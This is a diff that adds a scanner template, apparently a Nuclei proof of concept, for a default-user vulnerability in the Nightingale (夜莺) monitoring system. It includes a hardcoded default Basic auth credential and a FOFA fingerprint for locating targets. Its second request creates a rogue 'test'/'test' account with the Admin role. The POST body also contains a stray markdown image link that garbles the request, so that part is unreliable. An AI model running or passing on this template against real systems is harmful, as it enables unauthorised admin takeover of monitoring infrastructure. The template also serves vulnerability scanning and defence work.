@@ -1,0 +1,47 @@
+id: poc-zby09vwwmh8zzx9d
+info:
+  name: 夜莺开源监控系统user接口存在默认用户漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zby09vwwmh8zzx9d'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zby09vwwmh8zzx9d
+    fofa: icon_hash="-2047686847"
+http:
+- raw:
+  - 'GET /v1/n9e/users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ=='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /v1/n9e/users HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==
+
+    Content-Type: application/json
+
+    Content-Length: 61
+
+
+    {"Username":"test","Password":"test","Roles":["Admin"]}
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077477158-acfdeb88-4c01-4a0a-8505-5c31fbda2c27.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
